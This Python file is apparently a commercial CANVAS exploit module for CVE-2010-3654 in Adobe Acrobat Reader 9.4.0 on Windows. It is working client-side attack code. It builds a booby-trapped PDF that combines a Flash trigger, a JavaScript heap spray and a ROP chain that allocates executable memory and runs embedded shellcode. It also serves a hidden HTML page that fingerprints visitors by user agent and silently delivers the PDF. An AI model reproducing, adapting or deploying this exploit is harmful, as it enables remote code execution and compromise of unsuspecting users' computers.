##ImmunityHeader v1
###############################################################################
## File       :  adobe_flash_button.py
## Description:
##            :
## Created_On :  Tue Nov 5 11:07:40 2010
## Created_By :  Franco Riccobaldi
## Modified_On:  Tue Nov 5 11:07:40 2010
## Modified_By:  Franco Riccobaldi
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from encoder import xorencoder

NAME='adobe_flash_button'
DESCRIPTION='Adobe Acrobat Flash MultiName RadioButton Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION['Date public']='10/28/2010'
DOCUMENTATION['References']='http://www.adobe.com/support/security/advisories/apsa10-05.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2010-3654'
DOCUMENTATION['VersionsAffected']='Adobe Acrobat Reader 9.4.0.'
DOCUMENTATION['NOTES']="""Exploitation through an PDF file is more reliable than with a
direct HTML/Flash exploit"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']
PROPERTY['DELIVERY']='HTTP'
NOTES="""
Tested on Windows XP Professional SP3 English with Acrobat Reader 9.4.0.

Does not work with HTTP MOSDEF
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0]
}

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *
from libs.ua_parser import user_agent_parser


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version=0
        self.name=NAME
        self.badstring='\0\xff'
        self.source_pdf       = 'blank.pdf'
        self.triggerswf       = 'trigger_button.swf'
        self.htmlfilename     = ''.join([random.choice(string.uppercase) for x in range(8)])+'.html'
        self.dest_pdf         = ''.join([random.choice(string.uppercase) for x in range(8)])+'.pdf'
        from engine.config import canvas_root_directory
        self.respath          = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.nohttpmosdef     = True
        return

    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            return 0

        major,minor,build,patch=self.getReaderVersions(info_dict)
        if not major:
            #no Reader
            return 0
        if major==9:
            if minor<=4:
                if build<=0:
                    return 100
        return 0

    def addRichMedia(self,page, buffer, swffilename,x1,y1,x2,y2):
        annot=DictionaryObject()

        appearance=DictionaryObject()
        appearance[NameObject("/Subtype")]=NameObject("/Form")
        appearance[NameObject("/Matrix")]=ArrayObject([NumberObject("1"), NumberObject("0"), NumberObject("0"), NumberObject("1"), NumberObject("0"), NumberObject("0")])
        appearance[NameObject("/BBox")]=ArrayObject([NumberObject("0"), NumberObject("0"), NumberObject("30"), NumberObject("30")])

        annot[NameObject('/Type')]=NameObject("/Annot")
        annot[NameObject('/Subtype')]=NameObject("/RichMedia")
        annot[NameObject('/NM')]=TextStringObject(swffilename)
        annot[NameObject('/AP')]=DictionaryObject( { NameObject("/N") : appearance } )
        annot[NameObject('/F')]=NumberObject(68)
        annot[NameObject('/Rect')]=ArrayObject([NumberObject(x1), NumberObject(y1), NumberObject(x2), NumberObject(y2)])

        data=StreamObject()
        data._data=buffer
        data[NameObject("/DL")]=NumberObject(len(buffer))
        data[NameObject("/Params")]=DictionaryObject( { NameObject("/Size"):NumberObject(len(buffer)) } )

        filespec=DictionaryObject( { NameObject("/Type"):NameObject("/Filespec"), \
                                     NameObject("/F"):TextStringObject(swffilename), \
                                     NameObject("/UF"):TextStringObject(swffilename), \
                                     NameObject("/EF"):DictionaryObject( { NameObject("/F"):data } ) } )

        #config the player
        config = DictionaryObject()
        config[NameObject("/Type")]=NameObject("/RichMediaConfiguration")
        config[NameObject("/Subtype")]=NameObject("/Flash")
        config[NameObject("/Instances")]=ArrayObject()

        instance=DictionaryObject()
        instance[NameObject("/Params")]=DictionaryObject( { NameObject("/Binding"):TextStringObject("Background") } )
        instance[NameObject("/Asset")]=filespec
        config["/Instances"].append(instance)

        #activate as soon as any part of the page that contains the annotation becomes visible, deactivate at user request
        activation = DictionaryObject( { NameObject("/Condition") : NameObject("/PO"),\
                                         NameObject("/Type") : NameObject("/RichMediaActivation"),\
                                         NameObject("/Configuration") : config } )
        deactivation = DictionaryObject( { NameObject("/Condition") : NameObject("/PC"),\
                                           NameObject("/Type") : NameObject("/RichMediaDeactivation") } )

        annot[NameObject('/RichMediaSettings')]=DictionaryObject( { NameObject("/Activation"):activation,\
                                                                               NameObject("/Deactivation"):deactivation,\
                                                                                          NameObject("/Configuration"):config } )


        annot[NameObject('/RichMediaContent')]=DictionaryObject( { NameObject("/Configurations"):ArrayObject( [ config ] ),\
                                                                   NameObject("/Assets"):\
                                                                   DictionaryObject( { \
                                                                       NameObject("/Names"):\
                                                                       ArrayObject( [ TextStringObject(swffilename), filespec ] ) \
                                                                   } ) } )

        page['/Annots'].append(annot)

        return True

    def setJS(self, input, content):
        #create the js entry first
        input.trailer['/Root'][NameObject('/Names')] = DictionaryObject()
        input.trailer['/Root']['/Names'][NameObject('/JavaScript')] = DictionaryObject()
        input.trailer['/Root']['/Names']['/JavaScript'][NameObject('/Names')] = ArrayObject()
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(TextStringObject('Spray'))
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(DictionaryObject())
        input.trailer['/Root'][NameObject('OpenAction')] = DictionaryObject()

        #set the js content
        jsobject = StreamObject()
        jsobject._data = content

        jsdict=input.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/S')] = NameObject('/JavaScript')
        jsdict[NameObject('/JS')] = jsobject.flateEncode()


    def makeJS(self):
        #Will write a 0x14 byte stager in a RWE VirtualAlloc'ed page and jump to
        #it. Stager will copy 0xfe0 bytes in that page and execute them.

        depchain = """
        sBoF = myescape(0x238DB1D6); // VALLOC / RET (replace with 0x070022A3 for int3)
        sBoF += myescape(0x00000000); // NULL
        sBoF += myescape(0x00000400); // SIZE
        sBoF += myescape(0x00001000); // MEM_COMMIT
        sBoF += myescape(0x00000040); // PAGE_EXECUTE_READWRITE
        sBoF += myescape(0x070015BB); // POP ECX
        sBoF += myescape(0x5004045B);
        sBoF += myescape(0x0700154D); // MOV DWORD PTR DS:[EAX],ECX
        sBoF += myescape(0x0700A722); // ADD EAX,4
        sBoF += myescape(0x070015BB); // POP ECX
        sBoF += myescape(0x6a5e545f);
        sBoF += myescape(0x0700154D); // MOV DWORD PTR DS:[EAX],ECX
        sBoF += myescape(0x0700A722); // ADD EAX,4
        sBoF += myescape(0x070015BB); // POP ECX
        sBoF += myescape(0xe1c1591f);
        sBoF += myescape(0x0700154D); // MOV DWORD PTR DS:[EAX],ECX
        sBoF += myescape(0x0700A722); // ADD EAX,4
        sBoF += myescape(0x070015BB); // POP ECX
        sBoF += myescape(0xeba5f305);
        sBoF += myescape(0x0700154D); // MOV DWORD PTR DS:[EAX],ECX
        sBoF += myescape(0x0700A722); // ADD EAX,4
        sBoF += myescape(0x070015BB); // POP ECX
        sBoF += myescape(0xECEB9005);
        sBoF += myescape(0x0700154D); // MOV DWORD PTR DS:[EAX],ECX
        sBoF += myescape(0x07003924); // INC EAX
        sBoF += myescape(0x07003924); // INC EAX
        sBoF += myescape(0x0700112F); // CALL EAX
        """

        js = """
        function hexa(val) {
            var str=new Number(val).toString(16);
            while (str.length < 4)  str = "0" + str;
            return str;
        }
        function myescape(addr) {
           var str="";
           str="%u"+hexa(addr&0xffff)+"%u"+hexa((addr>>16)&0xffff);
           return str;
        }
        function repeat(count,what) {
            var v = "";
            while (--count >= 0) v += what;
            return v;
        }
        function go() {
            DEPCHAIN
            headersize = 20;
            blah = unescape("%u0700%u6b89"); // MOV ESP,59070188
            bigblock = unescape("%u0700%u6b89");
            wap = headersize+blah.length;
            while (bigblock.length<wap) bigblock+=bigblock;
            fillblock = bigblock.substring(0, wap);
            block = bigblock.substring(0, bigblock.length-wap);
            while(block.length+wap<0x80000) block = block+block+fillblock;
            mm = new Array();
            for (i=0;i<300;i++) mm[i] = block + blah;

            blah = unescape("%u0a0a%u0a0a");
            bigblock = unescape("%u0a0a%u0a0a");
            wap = headersize+blah.length;
            while (bigblock.length<wap) bigblock+=bigblock;
            fillblock = bigblock.substring(0, wap);
            block = bigblock.substring(0, bigblock.length-wap);
            while(block.length+wap<0x80000) block = block+block+fillblock;
            mm2 = new Array();
            for (i=0;i<800;i++) mm2[i] = block + blah;

            blah = unescape(sBoF) + unescape("SHELLCODE");
            bigblock = unescape("%u103C%u0700"); // RET
            wap = headersize+blah.length;
            while (bigblock.length<wap) bigblock+=bigblock;
            fillblock = bigblock.substring(0, wap);
            block = bigblock.substring(0, bigblock.length-wap);
            while(block.length+wap<0x80000) block = block+block+fillblock;
            mm3 = new Array();
            for (i=0;i<200;i++) mm3[i] = block + blah;
        }
        go();
        """.replace('SHELLCODE',urluencode(self.shellcode)).replace('DEPCHAIN',depchain)
        return js


    def makePDF(self):
        input = PdfFileReader(file('Resources/blank.pdf','rb'))
        page=input.getPage(0)
        page[NameObject("/MediaBox")]=ArrayObject((NumberObject(0),NumberObject(0),NumberObject(600),NumberObject(800)))
        page[NameObject('/Annots')]=ArrayObject()

        #Append SWF trigger
        swf = open(os.path.join(self.respath, self.triggerswf), 'rb').read()
        self.addRichMedia(page, swf, self.triggerswf,0,0,30,30)

        #Append JS
        self.setJS(input,self.makeJS())
        page=input.getPage(0)
        output=PdfFileWriter()
        output.addPage(page)
        root=output._root.getObject()
        root.update({NameObject('/Names'):input.trailer['/Root']['/Names']})

        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()


    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" HIDDEN=\"TRUE\" ></EMBED>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            self.createShellcode()
            b.setBody(self.makePDF())
            h.addHeader('Content-Type','application/pdf')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

    def getArgs(self):
        self.host=self.target.interface
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        fd=file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

